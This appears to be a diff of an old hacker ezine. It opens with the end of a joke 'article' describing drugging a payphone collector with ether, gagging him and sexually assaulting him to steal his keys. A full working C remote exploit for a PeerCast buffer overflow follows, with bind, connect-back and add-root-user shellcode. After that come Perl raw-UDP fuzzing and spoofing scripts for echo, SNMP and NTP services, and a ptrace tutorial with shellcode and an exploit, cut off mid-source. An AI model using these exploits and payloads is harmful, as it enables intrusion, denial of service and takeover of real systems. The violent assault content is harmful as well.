+accomplish. I higly recommend bringing balls.
+
+Ok So the first step is to stake out your payphone when you think the 
+payphone man will come empty the coins out of the box. Sometimes they are late
+getting to their job because they sometimes dont know how to drive well. 
+If they happen to be really late, then you can play with the balls you brought
+if you brought any at all. Depending on the kind of balls you have you can 
+play with them in many ways. I like to play tennis sometimes, but im not going
+to tell you how to play with your balls regardless of what sports I like.
+
+Ok so when the pay phone man shows up, put your balls away and put on your
+ninja gear and get out the ether. Take the ether and juice up the rag you
+brought.
+
+Next sneak up on the pay phone man and smother his face with the ether rag.
+The longer you hold it there the higher and less alert he will become. Hold
+it there long enough so he is just barely consous.
+
+Just incase he wakes up you can stick one or more of your balls into his mouth
+to gag him. 
+
+This next part is the part that involves social engeneering to some degree. What
+you want to do is take his keys, but not let him know that you have taken his
+keys for as long as possible.
+
+With this in mind, pull down his pants and stick the pickle into his anus. 
+By doing this, the last thing he will think about when he wakes up and finds a
+pickle in his ass is where the payphone keys are.
+
+Now the last step is to take your ninja sword and bust some elite ninja moves
+when the payphone man wakes up so he will know how bad ass you are and he will
+never want to mess with you again.
+
+The End.
+
+-G-unit thugz
+Febuary 2006
+
+
+-About the Author-
+The author of this article is a famous inventor and haxxor. He is responsible 
+for the downfall of MaBell and inventor of fiber optix cablez and telephone.
+
+
+
+/* PRIVATE - DO NOT DISTRIBUTE - PRIVATE - DO NOT DISTRIBUTE -PRIVATE
+*
+* the preceding document is a PRIVATE exploit. If I gave you this
+* exploit then please DO NOT GIVE IT TO ANYONE.
+*
+* PRIVATE - DO NOT DISTRIBUTE - PRIVATE - DO NOT DISTRIBUTE -PRIVATE */
+
+
+
+0100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0100
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+0100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0100
+:?
+:> PeerCast Exploit k0d3z
+:o prdelka
+:?
+0100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0100
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0100
+
+
+/* GNU PeerCast <= v0.1216 Remote Exploit
+ * ======================================
+ * PeerCast is a simple, free way to listen to radio and watch video on the internet. A 
+ * remotely exploitable buffer overflow has been identified by INFIGO-2006-03-01 which 
+ * can be potentially exploited to execute arbitrary code due to insufficient bounds
+ * checking on a memory copy operation occuring on the stack. All versions upto and
+ * prior to v0.1216 are believed to be vulnerable. Return address does a "jmp esp" which
+ * references the start of our shellcode and as such will work on multiple distributions
+ * and VA randomized hosts.
+ * 
+ * Example.
+ * matthew@localhost ~/code/exploits $ ./prdelka-vs-GNU-peercast -s 123.123.123.123 -c 0 -t 1 -x 31337
+ * [ GNU PeerCast <= v0.1216 remote exploit
+ * [ Using shellcode 'Linux bind() shellcode (4444/tcp default)' (84 bytes)
+ * [ Using target '(GNU peercast v0.1212) 2.6.14-gentoo-r2 (Gentoo 3.3.5.20050130-r1)'
+ * [ Connected to 123.123.123.123 (7144/tcp)
+ * [ Sent 883 bytes to target
+ * matthew@localhost ~/code/exploits $ nc 123.123.123.123 31337
+ * id
+ * uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+ * 
+ *  -prdelka
+ */
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <getopt.h>
+#include <signal.h>
+
+struct target {
+	char* name; 
+	int retaddr;	
+};
+
+struct shellcode {
+	char* name;	
+	int port;
+	int host;
+	char* shellcode;	
+};
+
+const int targetno = 2;
+
+struct target targets[] = { 
+	{"(GNU peercast v0.1212) 2.4.28-gentoo-r8 (Gentoo Linux 3.3.5-r1)",0x080918AF},
+	{"(GNU peercast v0.1212) 2.6.14-gentoo-r2 (Gentoo 3.3.5.20050130-r1)",0x080918AF}
+};
+
+const int shellno = 3;
+
+struct shellcode shellcodes[] = {
+	{"Linux bind() shellcode (4444/tcp default)",20,-1,
+	"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
+	"\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
+	"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
+	"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
+	"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
+	"\x89\xe1\xcd\x80"},
+	{"Linux connect() shellcode (4444/tcp default)",32,26,
+	"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
+	"\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\x01\x02\x03\x04\x66\x68"
+	"\x11\x5c\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
+	"\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
+	"\x89\xe1\xb0\x0b\xcd\x80"},
+	{"Linux add user 'syscfg' with {null} password and UID 0",-1,-1,
+	"\x31\xC0\x50\x68\x73\x73\x77\x64\x68\x2F\x2F\x70\x61\x68\x2F\x65"
+	"\x74\x63\x89\xE6\x31\xD2\x31\xC9\xB1\x01\x89\xF3\x31\xC0\xB0\x05"
+	"\xCD\x80\x50\x89\xE6\x31\xC0\xB0\x13\x8B\x1E\x31\xC9\x31\xD2\xB2"
+	"\x02\xCD\x80\x31\xC0\xB0\x04\x8B\x1E\x31\xC9\x51\x68\x61\x73\x68"
+	"\x0A\x68\x69\x6E\x2F\x62\x68\x74\x3A\x2F\x62\x68\x2F\x72\x6F\x6F"
+	"\x68\x63\x66\x67\x3A\x68\x66\x6F\x72\x20\x68\x73\x65\x72\x20\x68"
+	"\x65\x6D\x20\x75\x68\x73\x79\x73\x74\x68\x30\x3A\x30\x3A\x68\x66"
+	"\x67\x3A\x3A\x68\x73\x79\x73\x63\x89\xE1\x31\xD2\xB2\x30\xCD\x80"
+	"\x31\xC0\xB0\x06\x8B\x1E\xCD\x80"}
+};
+
+void dummyhandler(){
+}
+
+int main (int argc, char *argv[]) {
+	int sd, rc, i, c, ret, payg, paya, payb, eip, ishell = 0, port = 7144, ihost = 0, itarg = 0;
+	int count, offset, ioffset, index = 0;
+	short shellport;
+	char *host, *buffer, *buffer2, *payload;
+	struct sockaddr_in localAddr, servAddr;
+	struct hostent *h, *rv;
+        static struct option options[] = {
+        	{"server", 1, 0, 's'},
+	        {"port", 1, 0, 'p'},
+        	{"target", 1, 0, 't'},
+		{"shellcode", 1, 0, 'c'},
+		{"shellport", 1, 0, 'x'},
+		{"shellhost", 1, 0, 'i'},
+		{"help", 0, 0,'h'}
+        };
+	printf("[ GNU PeerCast <= v0.1216 remote exploit\n");
+	while(c != -1)
+	{
+	        c = getopt_long(argc,argv,"s:p:t:c:x:i:h",options,&index);	
+        	switch(c) {
+               		case -1:
+	                        break;
+        	        case 's':
+				if(ihost==0){
+				h = gethostbyname(optarg);				
+				if(h==NULL){
+					printf("[ Error unknown host '%s'\n",optarg);
+					exit(1);
+				}
+				host = malloc(strlen(optarg) + 1);
+				sprintf(host,"%s",optarg);
+				ihost = 1;
+				}
+               			break;
+	                case 'p':
+				port = atoi(optarg);
+                	        break;
+			case 'c':
+				if(ishell==0)
+				{
+				payg = atoi(optarg);
+				switch(payg){
+				case 0:		
+					printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));		
+					payload = malloc(strlen(shellcodes[payg].shellcode)+1);
+					memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
+					memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
+					ishell = 1;
+					break;
+				case 1:
+                                       printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
+                                       payload = malloc(strlen(shellcodes[payg].shellcode)+1);
+	                               memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
+	                               memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
+	                               ishell = 1;
+	                               break;
+                                case 2:
+                                       printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
+                                       payload = malloc(strlen(shellcodes[payg].shellcode)+1);
+                                       memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
+        	                       memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
+	                               ishell = 1;
+				       break;
+				default:
+					printf("[ Invalid shellcode selection %d\n",payg);
+					exit(0);
+					break;
+				}
+				}
+				break;
+			case 'x':
+				if(ishell==1)
+				{
+					if(shellcodes[payg].port > -1)
+					{
+						paya = strlen(payload);
+						shellport = atoi(optarg);
+						shellport =(shellport&0xff)<<8 | shellport>>8;
+						memcpy(&payload[shellcodes[payg].port],&shellport,sizeof(shellport));
+						if(paya > strlen(payload))
+						{
+							printf("[ Shellcode port introduces null bytes\n");
+							exit(1);
+						}
+					}
+					else{
+						printf("[ (%s) port selection is ignored for current shellcode\n",optarg);
+					}
+				}
+				else{
+					printf("[ No shellcode selected yet, ignoring (%s) port selection\n",optarg);
+					break;
+				}
+				break;
+			case 'i':
+				if(ishell==1)
+				{
+					if(shellcodes[payg].host > -1)
+					{
+						paya = strlen(payload);
+						rv = gethostbyname(optarg);
+						if(h==NULL){
+							printf("[ Error unknown host '%s'\n",optarg);
+							exit(1);
+						}
+						memcpy(&payload[shellcodes[payg].host],rv->h_addr_list[0], rv->h_length);
+						if(paya > strlen(payload))
+						{
+							printf("[ Shellhost introduces null bytes\n");
+							exit(1);
+						}
+					}
+					else{
+						printf("[ (%s) shellhost selection is ignored for current shellcode\n",optarg);
+					}
+				}
+				else{
+					printf("[ No shellcode selected yet, ignoring (%s) shellhost selection\n",optarg);
+				}
+				break;
+	                case 't':
+				if(itarg==0){
+				ret = atoi(optarg);			
+				switch(ret){
+					case 0:				
+						printf("[ Using target '%s'\n",targets[ret].name);
+						eip = targets[ret].retaddr;
+						break;
+                                        case 1:
+                                                printf("[ Using target '%s'\n",targets[ret].name);
+                                                eip = targets[ret].retaddr;
+                                                break;
+					default:
+						eip = strtoul(optarg,NULL,16);
+						printf("[ Using return address '0x%x'\n",eip);
+						break;
+				}
+				itarg = 1;
+				}
+        	                break;
+			case 'h':			
+				printf("[ Usage instructions.\n[\n");				
+				printf("[ %s <required> (optional)\n[\n[   --server|-s <ip/hostname>\n",argv[0]);
+				printf("[   --port|-p (port)[default 7144]\n[   --shellcode|-c <shell#>\n");
+				printf("[   --shellport|-x (port)\n");
+				printf("[   --shellhost|-i (ip/hostname)\n");
+				printf("[   --target|-t <target#/0xretaddr>\n[\n");
+				printf("[ Target#'s\n");
+				for(count = 0;count <= targetno - 1;count++){
+					printf("[ %d %s 0x%x\n",count,targets[count],targets[count]);
+				}
+				printf("[\n[ Shellcode#'s\n");
+				for(count = 0;count <= shellno - 1;count++){
+					printf("[ %d \"%s\" (length %d bytes)\n",count,shellcodes[count].name,strlen(shellcodes[count].shellcode));
+				}
+				exit(0);
+				break;
+			default:
+                		break;
+	        }
+	}
+	if(itarg != 1 || ihost  != 1 || ishell != 1){
+		printf("[ Error insufficient arguements, try running '%s --help'\n",argv[0]);
+		exit(1);
+	}
+	signal(SIGPIPE,dummyhandler);
+        servAddr.sin_family = h->h_addrtype;
+	memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
+	servAddr.sin_port = htons(port);
+	sd = socket(AF_INET, SOCK_STREAM, 0);
+	if(sd<0) {
+		printf("[ Cannot open socket\n");	
+		exit(1);
+	}
+	rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
+	if(rc<0) {
+		printf("[ Cannot connect\n");
+		exit(1);
+	}		
+	printf("[ Connected to %s (%d/tcp)\n",host,port);	
+	buffer = malloc(2048 + strlen(payload) + sizeof(eip));
+	memset(buffer,0,2048 + strlen(payload) + sizeof(eip));
+	strcpy(buffer,"GET /stream/?");
+	for(count = 0;count <= 779;count++){
+		strcat(buffer,"A");
+	}
+	buffer2 = (char*)((int)buffer + (int)strlen(buffer));
+	memcpy((void*)buffer2,(void*)&eip,sizeof(eip));
+	buffer2 = (char*)((int)buffer2 + sizeof(eip));
+	memcpy((void*)buffer2,(void*)payload,strlen(payload));
+	strcat(buffer2,"\r\n");
+	rc = send(sd,buffer,strlen(buffer),0);
+	printf("[ Sent %d bytes to target\n",rc);
+}
+
+
+0101x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0101
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+0101x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0101
+:?
+:> udp low level pen testing
+:o peanuter
+:?
+0101x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0101
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0101x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0101
+
+
+ NOTE: This article is dedicated to CDEJ cause
+ I love them very much!
+
+
+1::  User Datagram Protocol (UDP) Low Level Penetration Testing
+
+By Peanuter - peanuter_\@/_gmail.com dalnet #dab efnet #c1zc0 darpanet #m00 and 
+no I am not a member of m00
+
+UDP is my favorite protocol.  Full of sensual treats to please even the most 
+demanding l33t hax0r's networking sexual perversion.  Other users prefer to wear
+a condom during network intercourse.  Nay say I.  Raw socket is the 
+port for me!
+
+Let us begin.  Our example code:
+
+use Net::RawIP;
+
+if ( $ARGV[0] eq '' ) {
+    print "Usage: udp_poc\.pl <our ip address> <there ip address> ";
+    print "<ip packet length> <udp packet length> <times to repeat> ";
+    print "<dest port> <source port>\n";
+    print "Example: perl udp\.pl 99\.55\.24\.2 66\.18\.18\.18 0 0 40 7 2011\n";
+    print "By setting <ip packet length> and <udp packet length> to zero";
+    print "Net::RawIp will replace them with correct values\.\n";
+    exit(0);
+}
+
+my $src_ip = $ARGV[0];
+my $dest_ip = $ARGV[1];
+my $IP_length = $ARGV[2];
+my $UDP_length = $ARGV[3];
+my $Repeat_A = $ARGV[4];
+my $dest_port = $ARGV[5];
+my $src_port = $ARGV[6];
+
+#build our simple fuz
+my $data   = "\x41" x $Repeat_A;
+
+#identify protocol used
+my $sock = new Net::RawIP( { udp => {} } );
+
+#build our packet
+$sock->set(
+    {
+        ip => {
+            saddr   => $src_ip,
+            daddr   => "$dest_ip",
+            tot_len => $IP_length,
+#            frag_off => 1,
+#            tos      => 0,
+#            id       => 1511,
+#            version  => ,
+#            ihl      => ,
+#            id       => ,
+#            ttl      => ,
+#            protocol => ,
+#            check    => 
+        },
+        udp => {
+            source => $src_port,
+            dest   => $dest_port,
+            data   => $data,
+            len    => $UDP_length,
+            check  => "0" #allowing net::rawip to build proper checksum
+        }
+    }
+);
+
+$sock->send;
+
+exit(0);
+
+For the following examples we will say that:
+Our ip address:                 80.80.80.80
+UDP server we are attacking is: 46.46.64.64
+
+UDP Echo Service port 7:
+
+Now there are various ways to find bugs within a udp echo server.  One attack 
+would be to set an incorrect Udp Header/data length.  Start up your sniffer to
+ see if you get a reply.
+
+perl udp.pl 80.80.80.80 46.46.64.64 0 200 4 7 2011
+
+This will send a udp packet to port 7 from our address to the udp servers 
+address with 4 A's and claiming to have stuffed 200 A's in the udp's data 
+section.  There are three possibilities of what will happen.
+
+First the udp echo server at the server we are attacking will just drop the 
+packet.  This is more then likely since thats what it should do.  Although you 
+will find differently with various pieces of networking equipment.
+
+Second we will get a reply but the reply will just be our 4 A's coming back to 
+us.  This is unlikely as you will see in the next example.
+
+Third we will get a reply with a data of 200 bytes.  The first 4 bytes will 
+simply be our A being returned, but in the following 196 bytes we will have 
+whatever is in the network cache at that time.
+
+So whats important about the third kind of response?
+We can probably remotely sniff network traffic using malformed udp packets, or 
+at the least grab there networking tables.
+
+There are various other attack you can also preform on a udp echo server.  Such 
+as this: perl udp.pl 46.46.64.64 0 200 200 7 7
+
+This will send a packet spoofed to the source from the source.  The udp server 
+in some cases will not check to see if the echo it received is a response or 
+request.  It will fall into an infinite loop and bomb out the resources.
+
+Another thing to try is remote packet injection.  By setting our data longer 
+then our length it is possible that we will overwrite into other cache.  
+Although it would most likely take several failed attempts.
+ 
+Another attack would be to go beyond the RFC limits.  Check for bad math, 
+overflows.  This is all really self explanatory.  
+
+
+UDP SNMPD Service port 161:
+
+There are some protocol level attacks you can swing at snmp.  Our example code:
+
+use Net::RawIP;
+
+if ( $ARGV[0] eq '' ) {
+    print "Usage: snmp_udp_poc\.pl <our ip address> <there ip address> ";
+    print "<ip packet length> <udp packet length> <source port>";
+    print " <udp checksum\n";
+    print "Example: perl udp\.pl 99\.55\.24\.2 66\.18\.18\.18 0 0 40 2011 0\n";
+    print "By setting <ip packet length> or <udp packet length> or <checksum> to zero ";
+    print "Net::RawIp will replace them with correct values\.\n";
+    exit(0);
+}
+
+my $src_ip = $ARGV[0];
+my $dest_ip = $ARGV[1];
+my $IP_length = $ARGV[2];
+my $UDP_length = $ARGV[3];
+my $dest_port = 161;
+my $src_port = $ARGV[4];
+my $checksum = $ARGV[5];
+
+#here is a valid snmp 1 system description request
+
+$begining =           "\x30\x26"; #assuming this is a tos (type of service)
+$snmp_version =       "\x30\x26"; # snmp v1
+$community =          "\x04\x06\x70\x75\x62\x6c\x69\x63"; # community of public "password
+$pdu_type =           "\xa1\x19"; #get-next(1)
+$request_id =         "\x02\x04\x54\x40\x93\x68"; #0x54409368
+$error_status =       "\x02\x01\x00"; # no error
+$error_index =        "\x02\x01\x00"; # 0 
+$object_identifier =  "\x30\x09\x06\x05\x2b\x06\x01\x02\x01"; #mib 1.3.6.1.2.1
+$value =              "\x05\x00"; #null
+
+#mib 1.3.6.1.2.1
+$unorganized_data = "\x30\x26\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63" .
+                    "\xa1\x19\x02\x04\x54\x40\x93\x68\x02\x01\x00\x02\x01" .
+                    "\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05" .
+                    "\x00";
+
+
+$organized_data =   $begining
+  . $snmp_version
+  . $community
+  . $pdu_type
+  . $request_id
+  . $error_status
+  . $error_index
+  . $object_identifier
+  . $value;
+
+#identify protocol used
+my $sock = new Net::RawIP( { udp => {} } );
+
+#build our packet
+$sock->set(
+    {
+        ip => {
+            saddr   => $src_ip,
+            daddr   => "$dest_ip",
+            tot_len => $IP_length,
+#            frag_off => 1,
+#            tos      => 0,
+#            id       => 1511,
+#            version  => ,
+#            ihl      => ,
+#            id       => ,
+#            ttl      => ,
+#            protocol => ,
+#            check    =>
+        },
+        udp => {
+            source => $src_port,
+            dest   => $dest_port,
+            data   => $organized_data,
+            len    => $UDP_length,
+            check  => $checksum  #allowing net::rawip to build proper checksum
+        }
+    }
+);
+
+$sock->send;
+
+exit(0);
+
+
+Ok so basically same rules apply.  You can try various cool things with the 
+example I provided.  Attempt to change or fuzz different aspects of the request.
+
+Some ideas might be throwing a valid snmp request with added data.  Throw random 
+data at each particular function within the data itself.  Play with packet 
+length.  Go beyond that 1514 byte maximum.  You can get the raw $data's by 
+simply sniffing your valid requests with NetSnmp and just copy the data section 
+over.  Or you can build your own.  
+
+Next we will look at NTP (Network Time protocol) udp 123.
+
+
+use Net::RawIP;
+
+if ( $ARGV[0] eq '' ) {
+    print
+"Usage: udp_poc.pl <our ip address> <there ip address> <ip packet length> <udp packet length> <checksum>\n";
+    exit(0);
+}
+
+my $src_ip = $ARGV[0];
+
+#Proper NTP udp 123 response:
+
+#flags                          0c
+#peer clock stratum             01
+#peer polling interval          00
+#peer clock precision           ee
+#root delay                     00 00 00 00
+#clock dispersion               00 00 00 00
+#reference clock id             41 43 54 53
+#reference clock update time    c6 d9 8a ed af a3 01 21
+#originate time stamp           00 00 00 00 00 00 00 00
+#receive time stamp             c6 d9 8a f0 de 5a ff 2a
+#transmit time stamp            c6 d9 8a f0 de 5c 70 43
+
+$flags                       = "\x0c";
+$peer_clock_stratum          = "\x01";
+$peer_polling_interval       = "\x00";
+$peer_clock_precision        = "\xee";
+$root_delay                  = "\x00\x00\x00\x00";
+$clock_dispersion            = "\x00\x00\x00\x00";
+$reference_clock_id          = "\x41\x43\x54\x53";
+$reference_clock_update_time = "\xc6\xd9\x8a\xed\xaf\xa3\x01\x21";
+$originate_time_stamp        = "\x00\x00\x00\x00\x00\x00\x00\x00";
+$receive_time_stamp          = "\xc6\xd9\x8a\xf0\xde\x5a\xff\x2a";
+$transmit_time_stamp         = "\xc6\xd9\x8a\xf0\xde\x5c\x70\x43";
+
+$data = $flags
+  . $peer_clock_stratum
+  . $peer_polling_interval
+  . $peer_clock_precision
+  . $root_delay
+  . $clock_dispersion
+  . $reference_clock_id
+  . $reference_clock_update_time
+  . $originate_time_stamp
+  . $receive_time_stamp
+  . $transmit_time_stamp;
+
+my $sock = new Net::RawIP( { udp => {} } );
+
+$sock->set(
+    {
+        ip => {
+            saddr   => $src_ip,
+            daddr   => "$ARGV[1]",
+            tot_len => $ARGV[2],
+
+            #            frag_off=> 1,
+            #            tos     => 0,
+            #            id      => 1511
+        },
+        udp => {
+            source => 1220,
+            dest   => 123,
+            data   => $data,
+            len    => $ARGV[3],
+            check  => $ARGV[4]
+        }
+    }
+);
+$sock->send;
+
+exit(0);
+
+At this point you should get the point on possible attack vectors.  An added one 
+for this service may be injecting bad times onto remote hosts.  This could be 
+used to fubar logs.
+
+I think the biggest thing of interested would be trying to find a memory leak 
+the service itself.  Remotely sniffing a target without actually having to have 
+a shell on it is an awesome concept.  
+
+Remote packet injection is an even sexier concept.  Such as remote arp injection.  
+Your going to find this in services that doesn't watch the udp packet length as 
+closely as they should.  A lot of services just depend on that checksum being 
+correct.  Use this to your advantage.  Always make sure that your checksums are 
+valid.  Then the remote service will believe that the packet came corrupted.
+
+What you will end up finding with some snmp implementations is that your udp 
+length is used to create a buffer for the data.  So by setting this smaller then
+the actual data you get the infamous buffer overflow.
+
+Play around.  Try your ideas.  Fail.  Try again.  Fail.  Apply to other 
+protocols.  Fail.  Try again.  Fail.  You know the routine.  Eventually you hit
+the motherload sellout to some 0day buyer of the week and go out for a night 
+on the town with your thousand bucks.
+
+Hi and thank you to the following people:
+Drgreen, pollypop, ntwak0, all of darkend, slinksi, and fugi.
+I love you all.  Thanks for your great support over the years.
+
+References:
+http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-FX.pdf
+http://www.cisco.com/en/US/products/sw/iosswrel/ps1818/products_security_notice09186a00801aa0cc.html
+http://www.cisco.com/warp/public/707/NTP-pub.shtml
+http://www.faqs.org/rfcs/rfc768.html
+http://www.faqs.org/rfcs/rfc1157.html
+http://www.faqs.org/rfcs/rfc958.html
+http://www.frsirt.com/english/vendor/2471
+
+
+
+
+
+
+0110x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0110
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0110x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0110
+:?
+:> finding the exact ret addr
+:o frate
+:?
+0110x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0110
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0110x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0110
+
+
+  
+	:: Table of contents
+  
+  		:: 0x01 - Introduction
+  		:: 0x02 - ptrace()
+  		:: 0x03 - Example
+		:: 0x04 - rfind.c source
+  
+  
+
+:: 0x01 - Introduction
+
+	
+	One day when I was trying to exploit a bug, I realized that I didn't 
+        know any good method for really finding the shellcode from stack easily.
+        Finding	return address is usually the hardest part of developing 
+        exploits and I 	didn't like the basic idea of "guessing" the address. 
+        I wanted something easier and exact. ptrace() was an answer to my prays.
+
+	You should have enough knowledge about exploitation and programming 
+        because	this paper is just a really short description about this trick. 
+        I'm using linux but it should also work on any other operating system 
+        with ptrace() call.
+	
+	Perhaps someone has already done this, i don't care, i did it again then 
+        :)
+
+
+
+:: 0x02 - ptrace()
+
+
+	ptrace() is a syscall which allowes process to control and observe core 
+        image and registers of another process. And that is exactly what we want. 
+
+	Here is the prototype:
+
+		#include <sys/ptrace.h>
+		long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
+		
+	request = action we want to perform
+	pid	= hmm...process id
+	addr	= some requests use this address
+	data	= for passing data to some of the requests
+
+	So...our goal is to scan through the stack of the process and find our
+	shellcode. What we need to do is to:
+
+		1. Attach to process
+		2. Restart execution after attaching has stopped it.
+		3. Wait for execution to stop again(because of the SIGTERM)
+		4. Scan through the stack and search the pattern.
+		5. Detach
+
+	For doing all that we need 4 requests:
+
+		PTRACE_ATTACH
+			As the name says this is used for attaching to the 
+                        process	specified in "pid".
+
+		PTRACE_CONT
+			This is used for continuing execution of the process. 
+                        "pid" is the process id(surprise) and data is set to 0
+                        (for continuing).
+
+		PTRACE_DETACH
+			Detach from the process.
+
+		PTRACE_PEEKTEXT
+			Returns a word from address specified in "addr". We can 
+                        only get a word at a time but i think it is enough for 
+                        us.
+
+	We also need to wait() for the process to stop execution after overflow.
+
+	I have written a little example for doing this. Please read the source at
+	the end of the file. It takes pid and pattern as command line arguments. 
+        Note that pattern is 4bytes = 8chars in reverse order. so 
+        "\x31\xc0\x50\x68" would come "6850c031".
+
+
+
+:: 0x03 - Example
+	
+
+	Here is the victim:
+		
+
+		[frate::lap::~/code/rfind]$ cat test.c
+		#include <stdio.h>
+
+		int main(int argc, char **argv)
+		{
+		        char foo[50];
+		        fgets(foo,2,stdin);//just for halting the execution for a moment
+		        strcpy(foo,argv[1]);
+		
+		        return 0;
+		}
+
+
+		[frate::lap::~/code/rfind]$ ./test `perl -e 'print "a"x100'`
+
+		Segmentation fault
+		[frate::lap::~/code/rfind]$ gdb test
+		[...]
+		(gdb) r `perl -e 'print "a"x79'`
+		Starting program: /home/frate/code/rfind/test `perl -e 'print "a"x79'`
+
+
+		Program received signal SIGSEGV, Segmentation fault.
+		0x00616161 in ?? ()
+		(gdb) q
+
+
+	As we can see 80 chars would overwrite whole EIP. Now we can write almost
+	ready exploit. The only thing we still need is the return address.
+
+
+		[frate::lap::~/code/rfind]$ cat exp.c 
+		#include <stdio.h>
+		
+		#define LEN 80
+		#define RETADDR 0x61616161
+		
+		int main(void)
+		{
+		        char shellcode[]=
+		                "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
+		                "\x68\x2f\x2f\x62\x69\x89\xe3\x99"
+		                "\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+		
+		        char buf[200];
+		        int i;
+		        
+		        for(i=0; i < LEN; i+=4)
+		        {
+		                *(long *)&buf[i] = RETADDR;
+		        }
+		
+		        for(i=0; i < (LEN - strlen(shellcode) - 12); i++)
+		        {
+		                buf[i] = 0x90;
+		        }
+		
+		        memcpy(buf+1, shellcode, strlen(shellcode));
+		
+		        puts(buf);
+		
+		return 0;
+		}
+		
+
+	execute test like this "./test `exp`",and use rfind on another term.
+
+
+		[frate::lap::~/code/rfind]$ ps -A | grep test   
+		4580 pts/3    00:00:00 test
+		[frate::lap::~/code/rfind]$ rfind 4580 6850c031 
+		[+] attached to process
+		[+] waiting for process to stop
+		[+] Scanning...
+		
+		Pattern found from addr 0xbffff892
+		Pattern found from addr 0xbffff6b1
+		
+		[+] Detaching
+		[frate::lap::~/code/rfind]$ 
+		
+		
+	Perfect. We got two addresses: First one is argv[1] and second is foo[50].
+	We will use the second one and add it to our exploit. We could decrement it 
+	a bit for hitting the NOP slide first to make it perhaps more universal but 
+	we will now try the direct address.
+		
+
+		[frate::lap::~/code/rfind]$ ./test `exp`
+
+		sh-3.00$ 
+
+
+	Shell? Yes, please. That was too easy. :D
+
+
+
+:: 0x04 - rfind.c source
+
+
+	/*
+	rfind.c
+	
+		author: frate
+		
+		description: tool for finding a pattern from the stack of another process.
+		
+		usage: takes 2 arguments: pid and pattern. Pattern is 4bytes so you would
+			give 8 chars, and in reverse order. For example four first 
+			bytes of your shellcode are "\x31\xc0\x50\x68", you give
+			"6850c031".
+	*/
+	
+	
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <signal.h>
+	#include <syscall.h>
+	#include <sys/ptrace.h>
+	#include <sys/types.h>
+	#include <sys/wait.h>
+	#include <unistd.h>
+	#include <errno.h>
+	#include <string.h>
+	
+	void attach_locate(pid_t _pid, long _pattern);
+	void scan_stack(pid_t _pid, long _pattern);
+	
+	int main(int argc, char **argv)
+	{
+		long	pattern;
+		pid_t	pid;
+		size_t	len;
+		
+	
+		if(argc == 3)
+		{
+			len = strlen(argv[2]);
+			if(len > 8)
+			{
+				printf("[-] Pattern too long.(32bit==8char)\n");
+				exit(1);
+			}
+	
+			pattern = strtol(argv[2], NULL, 16);
